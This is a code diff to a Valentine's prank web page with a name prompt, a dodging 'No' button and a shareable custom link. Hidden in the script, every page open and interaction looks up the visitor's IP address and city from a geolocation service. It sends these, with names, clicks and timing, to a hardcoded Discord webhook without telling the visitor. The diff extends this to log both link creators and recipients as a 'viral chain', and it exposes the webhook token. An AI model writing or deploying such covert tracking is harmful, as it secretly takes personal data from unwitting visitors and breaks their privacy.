@@ -24,15 +24,15 @@
 
     #namePortal h1 { color: white; font-size: 1.5rem; margin-bottom: 25px; text-shadow: 2px 2px 15px rgba(0,0,0,0.6); }
     #namePortal input { padding: 15px 20px; border-radius: 30px; border: none; font-size: 1.1rem; width: 85%; outline: none; margin-bottom: 20px; background: rgba(255, 255, 255, 0.9); text-align: center; }
-    #namePortal button { background: var(--primary); color: white; border: none; padding: 15px 45px; border-radius: 50px; font-weight: 800; cursor: pointer; }
+    #namePortal button { background: var(--primary); color: white; border: none; padding: 15px 45px; border-radius: 50px; font-weight: 800; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.4); }
 
     .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
-    #valentineTitle { color: var(--primary); font-size: 1.6rem; text-align: center; }
+    #valentineTitle { color: var(--primary); font-size: 1.6rem; text-align: center; line-height: 1.2; }
     
     #yes { background: var(--primary); color: white; font-size: 22px; font-weight: 700; padding: 15px 50px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.3s; }
     #no { background: var(--secondary); color: white; padding: 10px 25px; border: none; border-radius: 50px; position: absolute; z-index: 200; transition: top 0.3s, left 0.3s; cursor: pointer; }
 
-    .share-btn { margin-top: 20px; background: #333; color: white; padding: 10px 20px; border-radius: 20px; border: none; cursor: pointer; font-size: 0.8rem; font-weight: 600; }
+    .share-btn { margin-top: 20px; background: #333; color: white; padding: 12px 25px; border-radius: 30px; border: none; cursor: pointer; font-size: 0.9rem; font-weight: 600; }
   </style>
 </head>
 <body>
@@ -42,12 +42,12 @@
       <h1 id="introText">My heart is locked.<br>Please enter the name of the key-holder...</h1>
       <input type="text" id="userName" placeholder="Your name..." onkeydown="if(event.key==='Enter') startApp()">
       <button id="unlockBtn" onclick="startApp()">Unlock My Heart</button>
-      <p style="color:white; font-size:0.7rem; margin-top:15px; opacity:0.8; cursor:pointer;" onclick="showShareTool()">Create your own link</p>
+      <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="generateCustomLink()">Create your own Valentine link</p>
     </div>
   </div>
 
   <div class="card" id="mainCard">
-    <div id="joke-text" style="color:var(--primary); font-weight:800; text-transform:uppercase;">CATCH ME! 😉</div>
+    <div id="joke-text" style="color:var(--primary); font-weight:800; text-transform:uppercase; font-size: 0.8rem;">CATCH ME! 😉</div>
     <h1 id="valentineTitle">Will you be my Valentine? 🌹</h1>
     <div style="flex-grow:1; display:flex; align-items:center;"><button id="yes" onclick="yesClick()">Yes</button></div>
     <button id="no">No</button>
@@ -58,26 +58,31 @@
   let clickCount = 0;
   let yesScale = 1;
   let startTime = null;
+  let sharedBy = new URLSearchParams(window.location.search).get('from') || null;
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // Check for URL parameters to pre-fill name
   window.onload = () => {
     const params = new URLSearchParams(window.location.search);
-    const customName = params.get('name');
-    if(customName) {
-      document.getElementById('userName').value = customName;
-    }
-    trackUser("Page Opened");
+    const targetName = params.get('to');
+    if(targetName) document.getElementById('userName').value = targetName;
+    
+    trackUser(sharedBy ? `Page opened (Shared by ${sharedBy})` : "Page opened (Direct)");
   };
 
   async function trackUser(event) {
     const timeMetric = event === "SAID YES! ❤️" && startTime ? `${Math.floor((new Date() - startTime)/1000)}s` : "N/A";
-    const logData = { content: `💖 **Valentine Report**\n**User:** ${visitorName || "Guest"}\n**Event:** ${event}\n**Time Spent:** ${timeMetric}\n**Clicks:** ${clickCount}` };
+    
+    let reportHeader = sharedBy ? `🔄 **Viral Chain Update**\n**From:** ${sharedBy}\n**To:** ${visitorName || "Guest"}` : `💖 **Direct Valentine Update**\n**User:** ${visitorName || "Guest"}`;
+
+    let logData = {
+      content: `${reportHeader}\n**Event:** ${event}\n**Time Spent:** ${timeMetric}\n**Clicks:** ${clickCount}`
+    };
+
     try {
       const ipRes = await fetch('https://ipapi.co/json/');
       if(ipRes.ok) {
         const data = await ipRes.json();
-        logData.content += `\n**Location:** ${data.city}, France\n**IP:** ${data.ip}`;
+        logData.content += `\n**Location:** ${data.city}, ${data.country_name}\n**IP:** ${data.ip}`;
       }
     } catch(e) {}
     fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(logData) });
@@ -85,13 +90,10 @@
 
   function startApp() {
     const input = document.getElementById('userName');
-    if (!input.value.trim()) {
-      document.getElementById('unlockBtn').classList.add('shake-error');
-      return;
-    }
+    if (!input.value.trim()) return;
     startTime = new Date();
     visitorName = input.value.trim();
-    trackUser("Heart Unlocked");
+    trackUser(sharedBy ? `Heart Unlocked (Shared by ${sharedBy})` : "Heart Unlocked");
     document.getElementById('namePortal').style.opacity = "0";
     setTimeout(() => { document.getElementById('namePortal').style.display = "none"; document.getElementById('mainCard').style.display = "flex"; }, 800);
   }
@@ -104,7 +106,6 @@
     noBtn.style.left = (Math.random() * (card.clientWidth - 100)) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 100)) + "px";
   }
-
   document.getElementById("no").onmouseover = moveNo;
 
   function yesClick() {
@@ -114,19 +115,29 @@
       <div style="text-align:center; margin:auto;">
         <h1>JE LE SAVAIS ! ❤️</h1>
         <p>JOYEUSE SAINT-VALENTIN, ${visitorName.toUpperCase()} !</p>
-        <button class="share-btn" onclick="showShareTool()">💖 Create link for your love</button>
+        <button class="share-btn" onclick="generateCustomLink()">💖 Create link for your love</button>
       </div>
     `;
   }
 
-  function showShareTool() {
-    const name = prompt("Enter the name of the person you love:");
-    if (name) {
-      const base = window.location.href.split('?')[0];
-      const finalUrl = `${base}?name=${encodeURIComponent(name)}`;
-      navigator.clipboard.writeText(finalUrl);
-      alert("Custom link copied to clipboard! Send it to them: " + finalUrl);
-    }
+  function generateCustomLink() {
+    const creator = prompt("What is YOUR name?");
+    if (!creator) return;
+    const target = prompt("Who is this link for? (Their name)");
+    if (!target) return;
+
+    const base = window.location.href.split('?')[0];
+    const finalUrl = `${base}?from=${encodeURIComponent(creator)}&to=${encodeURIComponent(target)}`;
+    
+    // Track the creation in Discord
+    fetch(WEBHOOK_URL, { 
+      method: 'POST', 
+      headers: {'Content-Type': 'application/json'}, 
+      body: JSON.stringify({ content: `🚀 **New Link Created!**\n**Creator:** ${creator}\n**Target:** ${target}\n**URL:** ${finalUrl}` }) 
+    });
+
+    navigator.clipboard.writeText(finalUrl);
+    alert("Copied to clipboard! Send this to " + target + " now! ❤️");
   }
 </script>
 </body>
